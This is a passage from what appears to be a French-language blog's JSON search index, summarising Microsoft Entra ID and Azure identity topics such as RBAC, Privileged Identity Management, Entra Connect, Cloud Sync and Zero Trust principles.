2)\u003c/li\u003e\n\u003cli\u003eAuthentification basée sur un certificat\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"windows-hello-entreprise\"\u003eWindows Hello Entreprise\u003c/h2\u003e\n\u003cp\u003eWindows Hello Entreprise est idéal pour les professionnels de l\u0026rsquo;information disposant de leur propre PC Windows. Les identifiants biométriques et le code PIN sont directement liés au PC de l\u0026rsquo;utilisateur, empêchant ainsi tout accès autre que celui du propriétaire. Grâce à l\u0026rsquo;intégration de l\u0026rsquo;infrastructure à clés publiques (PKI) et à la prise en charge intégrée de l\u0026rsquo;authentification unique (SSO), Windows Hello Entreprise offre un moyen pratique d\u0026rsquo;accéder facilement aux ressources de l\u0026rsquo;entreprise, sur site et dans le cloud.\u003c/p\u003e","title":""},{"content":"Le contrôle d\u0026rsquo;accès aux ressources avec Azure RBAC consiste à attribuer des rôles Azure. Il s\u0026rsquo;agit d\u0026rsquo;un concept essentiel à comprendre : c\u0026rsquo;est ainsi que les autorisations sont appliquées. L\u0026rsquo;attribution d\u0026rsquo;un rôle se compose de trois éléments : le principal de sécurité, la définition du rôle et l\u0026rsquo;étendue.\nUne définition de rôle est un ensemble d\u0026rsquo;autorisations. On l\u0026rsquo;appelle généralement simplement un rôle. Une définition de rôle répertorie les actions pouvant être effectuées, telles que la lecture, l\u0026rsquo;écriture et la suppression. Les rôles peuvent être de haut niveau, comme celui de propriétaire, ou spécifiques, comme celui de lecteur de machine virtuelle.\nComment Azure RBAC détermine si un utilisateur a accès à une ressource Voici les étapes générales utilisées par Azure RBAC pour déterminer si vous avez accès à une ressource. Ces étapes s\u0026rsquo;appliquent à Azure Resource Manager ou aux services de plan de données intégrés à Azure RBAC. Elles sont utiles pour résoudre un problème d\u0026rsquo;accès.\nUn utilisateur (ou principal de service) acquiert un jeton pour Azure Resource Manager. Ce jeton inclut les appartenances aux groupes de l\u0026rsquo;utilisateur (y compris les appartenances aux groupes transitifs). L’utilisateur effectue un appel d’API REST vers Azure Resource Manager avec le jeton attaché. Azure Resource Manager récupère toutes les attributions de rôles et refuse les attributions qui s’appliquent à la ressource sur laquelle l’action est effectuée. Si une affectation refusée s\u0026rsquo;applique, l\u0026rsquo;accès est bloqué. Sinon, l\u0026rsquo;évaluation se poursuit. Azure Resource Manager restreint les attributions de rôles qui s’appliquent à cet utilisateur ou à son groupe et détermine les rôles dont dispose l’utilisateur pour cette ressource. Azure Resource Manager détermine si l\u0026rsquo;action de l\u0026rsquo;appel d\u0026rsquo;API est incluse dans les rôles de l\u0026rsquo;utilisateur pour cette ressource. Si les rôles incluent Actionsun caractère générique ( *), les autorisations effectives sont calculées en soustrayant le NotActionsde la valeur autorisée Actions. De même, la même soustraction est effectuée pour toutes les actions de données. Actions - NotActions = Effective management permissions DataActions - NotDataActions = Effective data permissions Si l\u0026rsquo;utilisateur ne dispose pas d\u0026rsquo;un rôle pour l\u0026rsquo;action correspondant à la portée demandée, l\u0026rsquo;accès n\u0026rsquo;est pas autorisé. Dans le cas contraire, toutes les conditions sont évaluées. Si l\u0026rsquo;attribution de rôle comprend des conditions, celles-ci sont évaluées. Sinon, l\u0026rsquo;accès est autorisé. Si les conditions sont remplies, l\u0026rsquo;accès est autorisé. Sinon, l\u0026rsquo;accès est refusé. ","permalink":"https://nyobemichel.me/posts/azure/azure-rbac/","summary":"\u003cp\u003eLe contrôle d\u0026rsquo;accès aux ressources avec Azure RBAC consiste à attribuer des rôles Azure. Il s\u0026rsquo;agit d\u0026rsquo;un concept essentiel à comprendre : c\u0026rsquo;est ainsi que les autorisations sont appliquées. L\u0026rsquo;attribution d\u0026rsquo;un rôle se compose de trois éléments : le principal de sécurité, la définition du rôle et l\u0026rsquo;étendue.\u003c/p\u003e\n\u003cp\u003eUne définition de rôle est un ensemble d\u0026rsquo;autorisations. On l\u0026rsquo;appelle généralement simplement un rôle. Une définition de rôle répertorie les actions pouvant être effectuées, telles que la lecture, l\u0026rsquo;écriture et la suppression. Les rôles peuvent être de haut niveau, comme celui de propriétaire, ou spécifiques, comme celui de lecteur de machine virtuelle.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/enumeration---azure/","summary":"","title":""},{"content":"Microsoft Entra ID Governance est une solution de gouvernance des identités qui permet aux organisations d\u0026rsquo;améliorer leur productivité, de renforcer leur sécurité et de se conformer plus facilement aux exigences réglementaires et de conformité. Microsoft Entra ID Governance vous permet de garantir automatiquement l\u0026rsquo;accès des bonnes personnes aux bonnes ressources grâce à l\u0026rsquo;automatisation des processus d\u0026rsquo;identité et d\u0026rsquo;accès, à la délégation aux groupes d\u0026rsquo;entreprise et à une visibilité accrue.\nCycle de vie de l\u0026rsquo;identité Dans Microsoft Entra ID Governance, vous pouvez automatiser le cycle de vie de l\u0026rsquo;identité de ces personnes en utilisant :\nProvisionnement entrant à partir des sources RH de votre organisation, y compris la récupération à partir de Workday et SuccessFactors, pour maintenir automatiquement les identités des utilisateurs dans Active Directory et Microsoft Entra ID. Workflows de cycle de vie pour automatiser les tâches exécutées lors d\u0026rsquo;événements clés, comme avant l\u0026rsquo;arrivée d\u0026rsquo;un nouvel employé, lors de son changement de statut et lors de son départ. Par exemple, un workflow peut être configuré pour envoyer un e-mail contenant un code d\u0026rsquo;accès temporaire au responsable d\u0026rsquo;un nouvel utilisateur, ou un e-mail de bienvenue à l\u0026rsquo;utilisateur dès son premier jour. Stratégies d\u0026rsquo;attribution automatique dans la gestion des droits pour ajouter et supprimer les appartenances aux groupes, les rôles d\u0026rsquo;application et les rôles de site SharePoint d\u0026rsquo;un utilisateur, en fonction des modifications apportées aux attributs de l\u0026rsquo;utilisateur. Provisionnement d\u0026rsquo;utilisateurs pour créer, mettre à jour et supprimer des comptes d\u0026rsquo;utilisateurs dans d\u0026rsquo;autres applications, avec des connecteurs vers des centaines d\u0026rsquo;applications cloud et sur site via le système de gestion des identités interdomaines (SCIM), le protocole d\u0026rsquo;accès aux annuaires légers (LDAP) et le langage de requête structuré (SQL). Gestion des droits La gestion des droits est une fonctionnalité de gouvernance des identités qui permet aux organisations de gérer le cycle de vie des identités et des accès à grande échelle, en automatisant les flux de travail des demandes d\u0026rsquo;accès, les attributions d\u0026rsquo;accès, les révisions et l\u0026rsquo;expiration.\nCycle de vie de l\u0026rsquo;accès Les organisations ont besoin d\u0026rsquo;un processus pour gérer les accès au-delà de ce qui a été initialement prévu pour un utilisateur lors de la création de son identité.\nCycle de vie des accès privilégiés La gestion des accès privilégiés est un élément clé de la gouvernance moderne des identités, notamment compte tenu du risque d\u0026rsquo;abus associé aux droits d\u0026rsquo;administrateur pour une organisation. Les employés, fournisseurs et sous-traitants qui s\u0026rsquo;octroient des droits d\u0026rsquo;administrateur doivent voir leurs comptes et leurs droits d\u0026rsquo;accès privilégiés gérés.\n","permalink":"https://nyobemichel.me/posts/azure/gouvernance-de-microsoft-entra-id/","summary":"\u003cp\u003eMicrosoft Entra ID Governance est une solution de gouvernance des identités qui permet aux organisations d\u0026rsquo;améliorer leur productivité, de renforcer leur sécurité et de se conformer plus facilement aux exigences réglementaires et de conformité. Microsoft Entra ID Governance vous permet de garantir automatiquement l\u0026rsquo;accès des bonnes personnes aux bonnes ressources grâce à l\u0026rsquo;automatisation des processus d\u0026rsquo;identité et d\u0026rsquo;accès, à la délégation aux groupes d\u0026rsquo;entreprise et à une visibilité accrue.\u003c/p\u003e\n\u003ch2 id=\"cycle-de-vie-de-lidentité\"\u003eCycle de vie de l\u0026rsquo;identité\u003c/h2\u003e\n\u003cp\u003eDans Microsoft Entra ID Governance, vous pouvez automatiser le cycle de vie de l\u0026rsquo;identité de ces personnes en utilisant :\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/identit%C3%A9-et-acc%C3%A8s-s%C3%A9curis%C3%A9s/","summary":"","title":""},{"content":"Objectifs d\u0026rsquo;apprentissage Dans ce module, vous :\nCréer, configurer et gérer les utilisateurs Créer, configurer et gérer des groupes Gérer les licences Explorez les attributs de sécurité personnalisés et le provisionnement automatique Afficher les utilisateurs Pour afficher les utilisateurs Microsoft Entra, sélectionnez l\u0026rsquo; entrée « Utilisateurs » sous « Identité », puis ouvrez la vue « Tous les utilisateurs » . Prenez quelques instants pour accéder au portail et consulter vos utilisateurs. Observez la colonne « Type d\u0026rsquo;utilisateur » pour afficher les membres et les invités. En règle générale, Microsoft Entra ID définit les utilisateurs de trois manières :\nIdentités cloud : ces utilisateurs existent uniquement dans Microsoft Entra ID. Il peut s\u0026rsquo;agir de comptes administrateurs ou d\u0026rsquo;utilisateurs que vous gérez vous-même. Leur source est Microsoft Entra ID ou un annuaire Microsoft Entra externe si l\u0026rsquo;utilisateur est défini dans une autre instance Microsoft Entra mais a besoin d\u0026rsquo;accéder aux ressources d\u0026rsquo;abonnement contrôlées par cet annuaire. Lorsque ces comptes sont supprimés de l\u0026rsquo;annuaire principal, ils sont supprimés. Identités synchronisées avec l\u0026rsquo;annuaire : ces utilisateurs sont présents dans un annuaire Active Directory local. Une synchronisation via Microsoft Entra Connect permet d\u0026rsquo;intégrer ces utilisateurs à Azure. Leur source est Windows Server AD . Utilisateurs invités : ces utilisateurs existent en dehors d\u0026rsquo;Azure. Il peut s\u0026rsquo;agir de comptes d\u0026rsquo;autres fournisseurs cloud ou de comptes Microsoft, comme un compte Xbox LIVE. Leur source est « Utilisateur invité » . Ce type de compte est utile lorsque des fournisseurs ou sous-traitants externes ont besoin d\u0026rsquo;accéder à vos ressources Azure. Une fois leur intervention terminée, vous pouvez supprimer le compte et tous leurs accès. Créer un nouvel utilisateur dans Microsoft Entra ID Accédez au menu Identité dans le centre d’administration Microsoft Entra . Dans la navigation de gauche, sélectionnez Utilisateurs , puis Tous les utilisateurs. Dans la page Utilisateurs, dans le menu, sélectionnez + Nouvel utilisateur et Créer un nouvel utilisateur . Créer un groupe de sécurité dans Microsoft Entra ID Accédez à l’écran du centre d’administration Microsoft Entra. Dans la navigation de gauche, sous Identité , sélectionnez Groupes puis Tous les groupes . Dans l’écran Groupes, dans le menu, sélectionnez Nouveau groupe . Attribuer une licence à un groupe Dans la liste Tous les groupes , sélectionnez Marketing . Dans la fenêtre Marketing, sous Gérer , sélectionnez Licences . Notez qu\u0026rsquo;aucune licence n\u0026rsquo;est actuellement attribuée à ce groupe. Ouvrez un nouvel onglet dans votre navigateur. Accédez au centre d’administration Microsoft 365 à l’ adresse http://admin.microsoft.com . Sélectionnez Facturation dans le menu de gauche. Sélectionnez Licences . Dans la liste des licences dont vous disposez, sélectionnez-en une. Ensuite, vous sélectionnez Groupes dans la liste en haut de l’écran. Sur la page Groupes, sélectionnez + Attribuer une licence . Recherchez et sélectionnez le groupe Marketing que nous avons créé précédemment. Sélectionnez le bouton Attribuer en bas de la boîte de dialogue. Vous devriez recevoir un message indiquant que les licences ont été attribuées avec succès. Créer, configurer et gérer des groupes Un groupe Microsoft Entra permet d\u0026rsquo;organiser les utilisateurs, ce qui simplifie la gestion des autorisations. L\u0026rsquo;utilisation de groupes permet au propriétaire de la ressource (ou du répertoire Microsoft Entra) d\u0026rsquo;attribuer un ensemble d\u0026rsquo;autorisations d\u0026rsquo;accès à tous les membres du groupe, au lieu de devoir attribuer les droits un par un. Microsoft Entra ID vous permet de définir deux types de groupes différents.\nLes groupes de sécurité sont les plus courants et permettent de gérer l\u0026rsquo;accès des membres et des ordinateurs aux ressources partagées d\u0026rsquo;un groupe d\u0026rsquo;utilisateurs. Par exemple, vous pouvez créer un groupe de sécurité pour une stratégie de sécurité spécifique. Ainsi, vous pouvez attribuer un ensemble d\u0026rsquo;autorisations à tous les membres simultanément, au lieu de les attribuer individuellement à chaque membre. Cette option nécessite un administrateur Microsoft Entra. Groupes Microsoft 365 : offrez des opportunités de collaboration en donnant aux membres l\u0026rsquo;accès à une boîte aux lettres, un calendrier, des fichiers, un site SharePoint partagés, etc. Cette option vous permet également d\u0026rsquo;autoriser des personnes extérieures à votre organisation à accéder au groupe. Cette option est disponible pour les utilisateurs comme pour les administrateurs. Créer un groupe Microsoft 365 dans Microsoft Entra ID Accédez à la page Identité du centre d’administration Microsoft Entra dans le centre d’administration Microsoft Entra . Dans la navigation de gauche, sous sélectionnez Groupes . Dans la lame Groupes, dans le menu, sélectionnez Nouveau groupe . Créez un groupe en utilisant les informations suivantes : Modifier l\u0026rsquo;attribution de licence de groupe Ouvrez https://entra.microsoft.com pour accéder au centre d’administration Microsoft Entra. Dans la navigation de gauche, ouvrez Groupes . Sélectionnez Tous les groupes , puis sélectionnez l’un des groupes disponibles. Dans la navigation de gauche, sous Gérer , sélectionnez Licences . Vous verrez la liste des licences actuellement attribuées. Vous devrez utiliser le Centre d\u0026rsquo;administration Microsoft 365 pour effectuer les mises à jour.\nPassez en revue les tâches en cours, puis, dans le menu, sélectionnez + Tâches . Ouvrez https://admin.microsoft.com pour ouvrir le centre d’administration Microsoft 365. Sélectionnez Facturation . Sélectionnez ensuite Licences . Sélectionnez une licence disponible dans la liste. Sélectionnez Groupes dans le menu en haut de la page. Sélectionnez l’ option + Attribuer des licences . Sélectionnez le groupe que vous consultiez précédemment dans Microsoft Entra. Sélectionnez ensuite le bouton « Attribuer » en bas de la page. Sur la page « Licences » du groupe, vérifiez la modification. Vous devriez la voir dans le centre d\u0026rsquo;administration Microsoft Entra et dans le centre d\u0026rsquo;administration Microsoft 365. Mettre à jour les attributions de licences utilisateur Accédez au centre d’administration Microsoft Entra. Dans la navigation de gauche, sous Identité , sélectionnez Utilisateurs . Dans l’écran Utilisateurs, sélectionnez Dominique Koch . Dans la navigation de gauche, sélectionnez Licences. Dans le panneau Mettre à jour les attributions de licence, cochez la case correspondant à une ou plusieurs licences. Qu\u0026rsquo;est-ce qu\u0026rsquo;un attribut de sécurité personnalisé ? Les attributs de sécurité personnalisés de Microsoft Entra ID sont des attributs métier (paires clé-valeur) que vous pouvez définir et affecter aux objets Microsoft Entra. Ces attributs permettent de stocker des informations, de catégoriser des objets ou d\u0026rsquo;appliquer un contrôle d\u0026rsquo;accès précis à des ressources Azure spécifiques.\n","permalink":"https://nyobemichel.me/posts/azure/identit%C3%A9s-et-lacc%C3%A8s-avec-microsoft-entra/","summary":"\u003ch2 id=\"objectifs-dapprentissage\"\u003eObjectifs d\u0026rsquo;apprentissage\u003c/h2\u003e\n\u003cp\u003eDans ce module, vous :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCréer, configurer et gérer les utilisateurs\u003c/li\u003e\n\u003cli\u003eCréer, configurer et gérer des groupes\u003c/li\u003e\n\u003cli\u003eGérer les licences\u003c/li\u003e\n\u003cli\u003eExplorez les attributs de sécurité personnalisés et le provisionnement automatique\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"afficher-les-utilisateurs\"\u003eAfficher les utilisateurs\u003c/h2\u003e\n\u003cp\u003ePour afficher les utilisateurs Microsoft Entra, sélectionnez l\u0026rsquo; entrée \u003cstrong\u003e« Utilisateurs » sous\u003c/strong\u003e \u003cstrong\u003e« Identité\u003c/strong\u003e », puis ouvrez la vue \u003cstrong\u003e« Tous les utilisateurs »\u003c/strong\u003e . Prenez quelques instants pour accéder au portail et consulter vos utilisateurs. Observez la colonne \u003cstrong\u003e« Type d\u0026rsquo;utilisateur »\u003c/strong\u003e pour afficher les membres et les invités.\nEn règle générale, Microsoft Entra ID définit les utilisateurs de trois manières :\u003c/p\u003e","title":""},{"content":"L\u0026rsquo;authentification multifacteur est un processus qui demande à l\u0026rsquo;utilisateur des éléments d\u0026rsquo;identification supplémentaires lors de la connexion. Par exemple, il peut être invité à saisir un code sur son téléphone portable ou à fournir une empreinte digitale.\n","permalink":"https://nyobemichel.me/posts/azure/implement-multifactor-authentication-mfa/","summary":"\u003cp\u003eL\u0026rsquo;authentification multifacteur est un processus qui demande à l\u0026rsquo;utilisateur des éléments d\u0026rsquo;identification supplémentaires lors de la connexion. Par exemple, il peut être invité à saisir un code sur son téléphone portable ou à fournir une empreinte digitale.\u003c/p\u003e","title":""},{"content":"Synchronisation du hachage de mot de passe avec Microsoft Entra ID La synchronisation du hachage du mot de passe est l\u0026rsquo;une des méthodes de connexion utilisées pour obtenir une identité hybride. Microsoft Entra Connect synchronise le hachage du mot de passe d\u0026rsquo;un utilisateur depuis une instance Active Directory locale vers une instance Microsoft Entra cloud.\n","permalink":"https://nyobemichel.me/posts/azure/methode-de-connexion-azure/","summary":"\u003ch1 id=\"synchronisation-du-hachage-de-mot-de-passe-avec-microsoft-entra-id\"\u003eSynchronisation du hachage de mot de passe avec Microsoft Entra ID\u003c/h1\u003e\n\u003cp\u003eLa synchronisation du hachage du mot de passe est l\u0026rsquo;une des méthodes de connexion utilisées pour obtenir une identité hybride. Microsoft Entra Connect synchronise le hachage du mot de passe d\u0026rsquo;un utilisateur depuis une instance Active Directory locale vers une instance Microsoft Entra cloud.\u003c/p\u003e","title":""},{"content":"Microsoft Entra Cloud Sync est une nouvelle offre Microsoft conçue pour répondre à vos besoins en matière d\u0026rsquo;identité hybride et synchroniser vos utilisateurs, groupes et contacts avec Microsoft Entra ID. Pour ce faire, elle utilise l\u0026rsquo;agent de provisionnement cloud Microsoft Entra au lieu de l\u0026rsquo;application Microsoft Entra Connect. Elle peut toutefois être utilisée conjointement avec Microsoft Entra Connect Sync et offre les avantages suivants :\nPrise en charge de la synchronisation avec un locataire Microsoft Entra à partir d\u0026rsquo;un environnement de forêt Active Directory déconnecté multi-forêts : les scénarios courants incluent la fusion et l\u0026rsquo;acquisition (où les forêts AD de la société acquise sont isolées des forêts AD de la société mère) et les sociétés qui ont historiquement eu plusieurs forêts AD. Installation simplifiée avec des agents de provisionnement légers : les agents agissent comme un pont entre AD et Microsoft Entra ID, avec toute la configuration de synchronisation gérée dans le cloud. Plusieurs agents de provisionnement peuvent être utilisés pour simplifier les déploiements à haute disponibilité, particulièrement critiques pour les organisations qui s\u0026rsquo;appuient sur la synchronisation du hachage de mot de passe d\u0026rsquo;AD vers Microsoft Entra ID. Prise en charge des grands groupes jusqu\u0026rsquo;à 50 000 membres. Il est recommandé d\u0026rsquo;utiliser uniquement le filtre de portée de l\u0026rsquo;unité organisationnelle (UO) lors de la synchronisation de grands groupes. ","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-cloud-sync/","summary":"\u003cp\u003eMicrosoft Entra Cloud Sync est une nouvelle offre Microsoft conçue pour répondre à vos besoins en matière d\u0026rsquo;identité hybride et synchroniser vos utilisateurs, groupes et contacts avec Microsoft Entra ID. Pour ce faire, elle utilise l\u0026rsquo;agent de provisionnement cloud Microsoft Entra au lieu de l\u0026rsquo;application Microsoft Entra Connect. Elle peut toutefois être utilisée conjointement avec Microsoft Entra Connect Sync et offre les avantages suivants :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePrise en charge de la synchronisation avec un locataire Microsoft Entra à partir d\u0026rsquo;un environnement de forêt Active Directory déconnecté multi-forêts : les scénarios courants incluent la fusion et l\u0026rsquo;acquisition (où les forêts AD de la société acquise sont isolées des forêts AD de la société mère) et les sociétés qui ont historiquement eu plusieurs forêts AD.\u003c/li\u003e\n\u003cli\u003eInstallation simplifiée avec des agents de provisionnement légers : les agents agissent comme un pont entre AD et Microsoft Entra ID, avec toute la configuration de synchronisation gérée dans le cloud.\u003c/li\u003e\n\u003cli\u003ePlusieurs agents de provisionnement peuvent être utilisés pour simplifier les déploiements à haute disponibilité, particulièrement critiques pour les organisations qui s\u0026rsquo;appuient sur la synchronisation du hachage de mot de passe d\u0026rsquo;AD vers Microsoft Entra ID.\u003c/li\u003e\n\u003cli\u003ePrise en charge des grands groupes jusqu\u0026rsquo;à 50 000 membres. Il est recommandé d\u0026rsquo;utiliser uniquement le filtre de portée de l\u0026rsquo;unité organisationnelle (UO) lors de la synchronisation de grands groupes.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"Microsoft Entra Connect est une application Microsoft sur site conçue pour répondre à vos objectifs d’identité hybride.\nFonctionnalités de Microsoft Entra Connect Synchronisation du hachage du mot de passe - Une méthode de connexion qui synchronise un hachage du mot de passe AD local d\u0026rsquo;un utilisateur avec l\u0026rsquo;ID Microsoft Entra. Authentification directe: une méthode de connexion qui permet aux utilisateurs d\u0026rsquo;utiliser le même mot de passe sur site et dans le cloud, mais ne nécessite pas l\u0026rsquo;infrastructure supplémentaire d\u0026rsquo;un environnement fédéré. Intégration de fédération : la fédération est une option de Microsoft Entra Connect et permet de configurer un environnement hybride à l\u0026rsquo;aide d\u0026rsquo;une infrastructure AD FS locale. Elle offre également des fonctionnalités de gestion AD FS, telles que le renouvellement des certificats et le déploiement de serveurs AD FS supplémentaires. Synchronisation : création des utilisateurs, des groupes et d\u0026rsquo;autres objets. Vérification de la correspondance des informations d\u0026rsquo;identité de vos utilisateurs et groupes locaux avec celles du cloud. Cette synchronisation inclut également les hachages de mots de passe. Surveillance de la santé - Microsoft Entra Connect Health peut fournir une surveillance robuste et fournir un emplacement central dans le centre d\u0026rsquo;administration Microsoft Entra pour afficher cette activité. Microsoft Entra Connect Health assure une surveillance robuste de votre infrastructure d\u0026rsquo;identité sur site. Il vous permet de maintenir une connexion fiable à Microsoft 365 et à Microsoft Online Services. Cette fiabilité est assurée par des fonctionnalités de surveillance de vos principaux composants d\u0026rsquo;identité. De plus, les données clés relatives à ces composants sont facilement accessibles. ","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-connect/","summary":"\u003cp\u003eMicrosoft Entra Connect est une application Microsoft sur site conçue pour répondre à vos objectifs d’identité hybride.\u003c/p\u003e\n\u003ch2 id=\"fonctionnalités-de-microsoft-entra-connect\"\u003eFonctionnalités de Microsoft Entra Connect\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSynchronisation du hachage du mot de passe\u003c/strong\u003e - Une méthode de connexion qui synchronise un hachage du mot de passe AD local d\u0026rsquo;un utilisateur avec l\u0026rsquo;ID Microsoft Entra.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthentification directe\u003c/strong\u003e: une méthode de connexion qui permet aux utilisateurs d\u0026rsquo;utiliser le même mot de passe sur site et dans le cloud, mais ne nécessite pas l\u0026rsquo;infrastructure supplémentaire d\u0026rsquo;un environnement fédéré.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eIntégration de fédération\u003c/strong\u003e : la fédération est une option de Microsoft Entra Connect et permet de configurer un environnement hybride à l\u0026rsquo;aide d\u0026rsquo;une infrastructure AD FS locale. Elle offre également des fonctionnalités de gestion AD FS, telles que le renouvellement des certificats et le déploiement de serveurs AD FS supplémentaires.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSynchronisation\u003c/strong\u003e : création des utilisateurs, des groupes et d\u0026rsquo;autres objets. Vérification de la correspondance des informations d\u0026rsquo;identité de vos utilisateurs et groupes locaux avec celles du cloud. Cette synchronisation inclut également les hachages de mots de passe.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSurveillance de la santé\u003c/strong\u003e - Microsoft Entra Connect Health peut fournir une surveillance robuste et fournir un emplacement central dans le centre d\u0026rsquo;administration Microsoft Entra pour afficher cette activité.\nMicrosoft Entra Connect Health assure une surveillance robuste de votre infrastructure d\u0026rsquo;identité sur site. Il vous permet de maintenir une connexion fiable à Microsoft 365 et à Microsoft Online Services. Cette fiabilité est assurée par des fonctionnalités de surveillance de vos principaux composants d\u0026rsquo;identité. De plus, les données clés relatives à ces composants sont facilement accessibles.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"La gestion des identités privilégiées (Privileged Identity Management) permet l\u0026rsquo;activation des rôles en fonction du temps et des approbations afin de réduire les risques d\u0026rsquo;autorisations d\u0026rsquo;accès excessives, inutiles ou abusives sur les ressources qui vous sont importantes. Voici quelques-unes de ses principales fonctionnalités :\nFournissez un accès privilégié juste à temps aux ressources Microsoft Entra ID et Azure. Attribuez un accès limité dans le temps aux ressources à l’aide de dates de début et de fin. Exiger une approbation pour activer les rôles privilégiés. Appliquez l’authentification multifacteur pour activer n’importe quel rôle. Utilisez la justification pour comprendre pourquoi les utilisateurs s\u0026rsquo;activent. Recevez des notifications lorsque des rôles privilégiés sont activés. Effectuez des examens d’accès pour vous assurer que les utilisateurs ont toujours besoin de rôles. Téléchargez l\u0026rsquo;historique d\u0026rsquo;audit pour un audit interne ou externe. Empêche la suppression des dernières attributions de rôle d\u0026rsquo;administrateur global et d\u0026rsquo;administrateur de rôle privilégié actives. Une fois Privileged Identity Management configuré, les options Tâches, Gérer et Activité s\u0026rsquo;affichent dans le menu de navigation de gauche. En tant qu\u0026rsquo;administrateur, vous pouvez choisir entre des options telles que la gestion des rôles Microsoft Entra, la gestion des rôles de ressources Azure ou PIM pour les groupes. Lorsque vous choisissez ce que vous souhaitez gérer, les options correspondantes s\u0026rsquo;affichent.\nPour les rôles Microsoft Entra dans Privileged Identity Management, seul un utilisateur disposant du rôle d\u0026rsquo;administrateur de rôles privilégiés ou d\u0026rsquo;administrateur général peut gérer les affectations des autres administrateurs. Les administrateurs généraux, les administrateurs de sécurité, les lecteurs généraux et les lecteurs de sécurité peuvent également consulter les affectations aux rôles Microsoft Entra dans Privileged Identity Management.\n","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-privileged-identity-management/","summary":"\u003cp\u003eLa gestion des identités privilégiées (Privileged Identity Management) permet l\u0026rsquo;activation des rôles en fonction du temps et des approbations afin de réduire les risques d\u0026rsquo;autorisations d\u0026rsquo;accès excessives, inutiles ou abusives sur les ressources qui vous sont importantes. Voici quelques-unes de ses principales fonctionnalités :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFournissez un accès privilégié juste à temps aux ressources Microsoft Entra ID et Azure.\u003c/li\u003e\n\u003cli\u003eAttribuez un accès limité dans le temps aux ressources à l’aide de dates de début et de fin.\u003c/li\u003e\n\u003cli\u003eExiger une approbation pour activer les rôles privilégiés.\u003c/li\u003e\n\u003cli\u003eAppliquez l’authentification multifacteur pour activer n’importe quel rôle.\u003c/li\u003e\n\u003cli\u003eUtilisez la justification pour comprendre pourquoi les utilisateurs s\u0026rsquo;activent.\u003c/li\u003e\n\u003cli\u003eRecevez des notifications lorsque des rôles privilégiés sont activés.\u003c/li\u003e\n\u003cli\u003eEffectuez des examens d’accès pour vous assurer que les utilisateurs ont toujours besoin de rôles.\u003c/li\u003e\n\u003cli\u003eTéléchargez l\u0026rsquo;historique d\u0026rsquo;audit pour un audit interne ou externe.\u003c/li\u003e\n\u003cli\u003eEmpêche la suppression des dernières attributions de rôle d\u0026rsquo;administrateur global et d\u0026rsquo;administrateur de rôle privilégié actives.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUne fois Privileged Identity Management configuré, les options Tâches, Gérer et Activité s\u0026rsquo;affichent dans le menu de navigation de gauche. En tant qu\u0026rsquo;administrateur, vous pouvez choisir entre des options telles que la gestion des rôles Microsoft Entra, la gestion des rôles de ressources Azure ou PIM pour les groupes. Lorsque vous choisissez ce que vous souhaitez gérer, les options correspondantes s\u0026rsquo;affichent.\u003c/p\u003e","title":""},{"content":"La solution d\u0026rsquo;identifiants vérifiables de Microsoft utilise des identifiants décentralisés (DID) pour signer de manière cryptographique afin de prouver qu\u0026rsquo;une partie utilisatrice (vérificateur) atteste des informations prouvant sa propriété. Une compréhension de base des DID est recommandée à toute personne créant une solution d\u0026rsquo;identifiants vérifiables basée sur l\u0026rsquo;offre Microsoft.\n","permalink":"https://nyobemichel.me/posts/azure/microsoft-entra-verified-id/","summary":"\u003cp\u003eLa solution d\u0026rsquo;identifiants vérifiables de Microsoft utilise des identifiants décentralisés (DID) pour signer de manière cryptographique afin de prouver qu\u0026rsquo;une partie utilisatrice (vérificateur) atteste des informations prouvant sa propriété. Une compréhension de base des DID est recommandée à toute personne créant une solution d\u0026rsquo;identifiants vérifiables basée sur l\u0026rsquo;offre Microsoft.\u003c/p\u003e","title":""},{"content":"Zero Trust est un nouveau modèle de sécurité qui présuppose une violation et vérifie chaque requête comme si elle provenait d\u0026rsquo;un réseau non contrôlé.\nPrincipes directeurs du Zero Trust Pour répondre à ce nouveau monde de l\u0026rsquo;informatique, Microsoft recommande vivement le modèle de sécurité Zero Trust, qui repose sur ces principes directeurs :\nVérifier explicitement - Authentifiez et autorisez toujours en fonction de tous les points de données disponibles.\nUtilisez l\u0026rsquo;accès au moindre privilège - Limitez l\u0026rsquo;accès des utilisateurs avec l\u0026rsquo;accès juste-à-temps et juste-assez-suffisant (JIT/JEA), les politiques adaptatives basées sur les risques et la protection des données.\nSupposons une brèche : minimisez le rayon d\u0026rsquo;impact et segmentez l\u0026rsquo;accès. Vérifiez le chiffrement de bout en bout et utilisez l\u0026rsquo;analyse pour obtenir une visibilité, améliorer la détection des menaces et renforcer les défenses.\n","permalink":"https://nyobemichel.me/posts/azure/zero-trust/","summary":"\u003cp\u003eZero Trust est un nouveau modèle de sécurité qui présuppose une violation et vérifie chaque requête comme si elle provenait d\u0026rsquo;un réseau non contrôlé.\u003c/p\u003e\n\u003ch2 id=\"principes-directeurs-du-zero-trust\"\u003ePrincipes directeurs du Zero Trust\u003c/h2\u003e\n\u003cp\u003ePour répondre à ce nouveau monde de l\u0026rsquo;informatique, Microsoft recommande vivement le modèle de sécurité Zero Trust, qui repose sur ces principes directeurs :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVérifier explicitement\u003c/strong\u003e - Authentifiez et autorisez toujours en fonction de tous les points de données disponibles.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUtilisez l\u0026rsquo;accès au moindre privilège\u003c/strong\u003e - Limitez 